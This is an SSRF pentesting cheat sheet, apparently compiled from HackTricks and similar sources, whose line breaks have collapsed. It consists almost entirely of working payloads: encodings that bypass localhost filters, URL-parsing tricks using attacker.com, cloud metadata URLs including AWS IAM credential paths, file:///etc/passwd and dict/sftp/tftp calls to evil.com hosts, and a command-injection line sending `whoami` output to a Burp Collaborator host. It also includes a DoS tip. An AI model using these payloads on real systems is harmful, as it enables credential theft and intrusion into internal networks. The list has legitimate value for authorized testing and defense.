[https://book.hacktricks.xyz/pentesting-web/ssrf-server-side-request-forgery](https://book.hacktricks.xyz/pentesting-web/ssrf-server-side-request-forgery)

[https://highon.coffee/blog/ssrf-cheat-sheet/](https://highon.coffee/blog/ssrf-cheat-sheet/)

[URL Format Bypass - HackTricks](https://book.hacktricks.xyz/pentesting-web/ssrf-server-side-request-forgery/url-format-bypass)

[SSRF vulnerabilities and where to find them - Detectify Labs](https://labs.detectify.com/2022/09/23/ssrf-vulns-and-where-to-find-them/?fbclid=IwAR0xC3ymb4ufRUGRDOZWr7lleeatiJj_vH8dod9-84jKt0PN1z7evtHFccA)

# Local Host

```
All IPv4: 0All IPv6: ::All IPv4: 0.0.0.0Localhost IPv6: ::1All IPv4: 0000All IPv4: (Leading zeros): 00000000IPv4 mapped IPv6 address: 0:0:0:0:0:FFFF:7F00:00018-Bit Octal conversion: 0177.00.00.0132-Bit Octal conversion: 01770000000132-Bit Hex conversion: 0x7f000001# Localhosthttp://127.0.0.1:80http://127.0.0.1:443http://127.0.0.1:22http://127.1:80http://127.000000000000000.1http://0http:@0/ --> http://localhost/http://0.0.0.0:80http://localhost:80http://[::]:80/http://[::]:25/ SMTPhttp://[::]:3128/ Squidhttp://[0000::1]:80/http://[0:0:0:0:0:ffff:127.0.0.1]/thefilehttp://①②⑦.⓪.⓪.⓪# CDIR bypasshttp://127.127.127.127http://127.0.1.3http://127.0.0.0# Dot bypass127。0。0。1127%E3%80%820%E3%80%820%E3%80%821# Decimal bypasshttp://2130706433/ = http://127.0.0.1http://3232235521/ = http://192.168.0.1http://3232235777/ = http://192.168.1.1# Octal Bypasshttp://0177.0000.0000.0001http://00000177.00000000.00000000.00000001http://017700000001# Hexadecimal bypass127.0.0.1 = 0x7f 00 00 01http://0x7f000001/ = http://127.0.0.1http://0xc0a80014/ = http://192.168.0.200x7f.0x00.0x00.0x010x0000007f.0x00000000.0x00000000.0x00000001# Add 0s bypass127.000000000000.1# You can also mix different encoding formats# https://www.silisoftware.com/tools/ipconverter.php# Malformed and rarelocalhost:+11211aaalocalhost:00011211aaaahttp://0/http://127.1http://127.0.1# DNS to localhostlocaltest.me = 127.0.0.1customer1.app.localhost.my.company.127.0.0.1.nip.io = 127.0.0.1mail.ebc.apple.com = 127.0.0.6 (localhost)127.0.0.1.nip.io = 127.0.0.1 (Resolves to the given IP)www.example.com.customlookup.www.google.com.endcustom.sentinel.pentesting.us = Resolves to www.google.comhttp://customer1.app.localhost.my.company.127.0.0.1.nip.iohttp://bugbounty.dod.network = 127.0.0.2 (localhost)1ynrnhl.xip.io == 169.254.169.254spoofed.burpcollaborator.net = 127.0.0.1
```

### various bypasses

```
127.0.0.1:80127.0.0.1:443127.0.0.1:22127.1:8000.0.0.0:80localhost:80[::]:80/[::]:25/ SMTP[::]:3128/ Squid[0000::1]:80/[0:0:0:0:0:ffff:127.0.0.1]/thefile①②⑦.⓪.⓪.⓪127.127.127.127127.0.1.3127.0.0.02130706433/0177000000013232235521/3232235777/0x7f000001/0xc0a80014/{domain}@127.0.0.1127.0.0.1#{domain}{domain}.127.0.0.1127.0.0.1/{domain}127.0.0.1/?d={domain}{domain}@127.0.0.1127.0.0.1#{domain}{domain}.127.0.0.1127.0.0.1/{domain}127.0.0.1/?d={domain}{domain}@localhostlocalhost#{domain}{domain}.localhostlocalhost/{domain}localhost/?d={domain}127.0.0.1%00{domain}127.0.0.1?{domain}127.0.0.1///{domain}127.0.0.1%00{domain}127.0.0.1?{domain}127.0.0.1///{domain}st:+11211aaast:00011211aaaa0/127.1127.0.11.1.1.1 &@2.2.2.2# @3.3.3.3/127.1.1.1:80\@127.2.2.2:80/127.1.1.1:80\@@127.2.2.2:80/127.1.1.1:80:\@@127.2.2.2:80/127.1.1.1:80#\@127.2.2.2:80/
```

# Domain

```
https:attacker.comhttps:/attacker.comhttp:/\/\attacker.comhttps:/\attacker.com//attacker.com\/\/attacker.com//\/attacker.com//attacker.com%0D%0A/attacker.com\#attacker.com#%20@attacker.com@attacker.comhttp://169.254.1698.254\@attacker.comattacker%00.comattacker%E3%80%82comattacker。comⒶⓉⓉⒶⒸⓀⒺⓡ.Ⓒⓞⓜ# Try also to change attacker.com for 127.0.0.1 to try to access localhost# Try replacing https by http# Try URL-encoded charactershttps://{domain}@attacker.comhttps://{domain}.attacker.comhttps://{domain}%6D@attacker.comhttps://attacker.com/{domain}https://attacker.com/?d={domain}https://attacker.com#{domain}https://attacker.com@{domain}https://attacker.com#@{domain}https://attacker.com%23@{domain}https://attacker.com%00{domain}https://attacker.com%0A{domain}https://attacker.com?{domain}https://attacker.com///{domain}https://attacker.com\{domain}/https://attacker.com;https://{domain}https://attacker.com\{domain}/https://attacker.com\.{domain}https://attacker.com/.{domain}https://attacker.com\@@{domain}https://attacker.com:\@@{domain}https://attacker.com#\@{domain}https://attacker.com\anything@{domain}/https://www.victim.com(\u2044)some(\u2044)path(\u2044)(\u0294)some=param(\uff03)hash@attacker.com# On each IP position try to put 1 attackers domain and the others the victim domainhttp://1.1.1.1 &@2.2.2.2# @3.3.3.3/\#Parameter pollutionnext={domain}&next=attacker.com# Bypass via open redirecthttps://portswigger.net/web-security/ssrf/lab-ssrf-filter-bypass-via-open-redirection
```

### Cloud Meta Data files

```
## AWS# from http://docs.aws.amazon.com/AWSEC2/latest/UserGuide/ec2-instance-metadata.html\#instancedata-data-categorieshttp://169.254.169.254/latest/user-datahttp://169.254.169.254/latest/user-data/iam/security-credentials/[ROLE NAME]http://169.254.169.254/latest/meta-data/iam/security-credentials/[ROLE NAME]http://169.254.169.254/latest/meta-data/ami-idhttp://169.254.169.254/latest/meta-data/reservation-idhttp://169.254.169.254/latest/meta-data/hostnamehttp://169.254.169.254/latest/meta-data/public-keys/0/openssh-keyhttp://169.254.169.254/latest/meta-data/public-keys/[ID]/openssh-key# AWS - Dirs http://169.254.169.254/http://169.254.169.254/latest/meta-data/http://169.254.169.254/latest/meta-data/public-keys/## Google Cloud#  https://cloud.google.com/compute/docs/metadata#  - Requires the header "Metadata-Flavor: Google" or "X-Google-Metadata-Request: True"http://169.254.169.254/computeMetadata/v1/http://metadata.google.internal/computeMetadata/v1/http://metadata/computeMetadata/v1/http://metadata.google.internal/computeMetadata/v1/instance/hostnamehttp://metadata.google.internal/computeMetadata/v1/instance/idhttp://metadata.google.internal/computeMetadata/v1/project/project-id# Google allows recursive pulls http://metadata.google.internal/computeMetadata/v1/instance/disks/?recursive=true## Google#  Beta does NOT require a header atm (thanks Mathias Karlsson @avlidienbrunn)http://metadata.google.internal/computeMetadata/v1beta1/## Digital Ocean# https://developers.digitalocean.com/documentation/metadata/http://169.254.169.254/metadata/v1.jsonhttp://169.254.169.254/metadata/v1/ http://169.254.169.254/metadata/v1/idhttp://169.254.169.254/metadata/v1/user-datahttp://169.254.169.254/metadata/v1/hostnamehttp://169.254.169.254/metadata/v1/regionhttp://169.254.169.254/metadata/v1/interfaces/public/0/ipv6/address## Packetcloudhttps://metadata.packet.net/userdata## Azure#  Limited, maybe more exist?# https://azure.microsoft.com/en-us/blog/what-just-happened-to-my-vm-in-vm-metadata-service/http://169.254.169.254/metadata/v1/maintenance## Update Apr 2017, Azure has more support; requires the header "Metadata: true"# https://docs.microsoft.com/en-us/azure/virtual-machines/windows/instance-metadata-servicehttp://169.254.169.254/metadata/instance?api-version=2017-04-02http://169.254.169.254/metadata/instance/network/interface/0/ipv4/ipAddress/0/publicIpAddress?api-version=2017-04-02&format=text## OpenStack/RackSpace # (header required? unknown)http://169.254.169.254/openstack## HP Helion # (header required? unknown)http://169.254.169.254/2009-04-04/meta-data/ ## Oracle Cloudhttp://192.0.0.192/latest/http://192.0.0.192/latest/user-data/http://192.0.0.192/latest/meta-data/http://192.0.0.192/latest/attributes/## Alibabahttp://100.100.100.200/latest/meta-data/http://100.100.100.200/latest/meta-data/instance-idhttp://100.100.100.200/latest/meta-data/image-id## Enclosed Alphanumerichttp://⑯⑨。②⑤④。⑯⑨｡②⑤④/http://⓪ⓧⓐ⑨｡⓪ⓧⓕⓔ｡⓪ⓧⓐ⑨｡⓪ⓧⓕⓔ:80/Successfully bypassed a SSRF WAF by using a combination of IPV6 + Unicode. Payload for Metadata instances:http://[::ⓕⓕⓕⓕ:①⑥⑨。②⑤④。⑯⑨。②⑤④]:80Check images for response difference between 169.254.169.254 and the above payload I shared
```

# Protocols

```
file:///etc/passwddict://<user>;<auth>@<host>:<port>/d:<word>:<database>:<n>ssrf.php?url=dict://attacker:11111/ssrf.php?url=sftp://evil.com:11111/ssrf.php?url=tftp://evil.com:12346/TESTUDPPACKETssrf.php?url=ldap://localhost:11211/%0astats%0aquit# Gopher://Fortunately, you can use Gopherus[https://github.com/tarunkant/Gopherus] to create payloads for several services. Additionally, remote-method-guesser[https://github.com/qtc-de/remote-method-guesser] can be used to create gopher payloads for Java RMI services
```

# Other Test Cases

```
# SSRF via Referrer headerhttps://book.hacktricks.xyz/pentesting-web/ssrf-server-side-request-forgery\#ssrf-via-referrer-header# SSRF via SNI data from certificate  --> https://book.hacktricks.xyz/pentesting-web/ssrf-server-side-request-forgery\#ssrf-via-sni-data-from-certificateopenssl s_client -connecttarget.com:443 -servername "internal.host.com" -crlf# Wget File Upload https://book.hacktricks.xyz/pentesting-web/file-upload\#wget-file-upload-ssrf-trick# SSRF with Command Injectionurl=http://3iufty2q67fuy2dew3yug4f34.burpcollaborator.net?`whoami`# PDFs RenderingIf the web page is automatically creating a PDF with some information you have provided, you can insert some JS that will be executed by the PDF creator itself (the server) while creating the PDF and you will be able to abuse a SSRF. Find more information here. https://book.hacktricks.xyz/pentesting-web/xss-cross-site-scripting/server-side-xss-dynamic-pdf# From SSRF to DoSCreate several sessions and try to download heavy files exploiting the SSRF from the sessions.# SSRf PHP Functions
```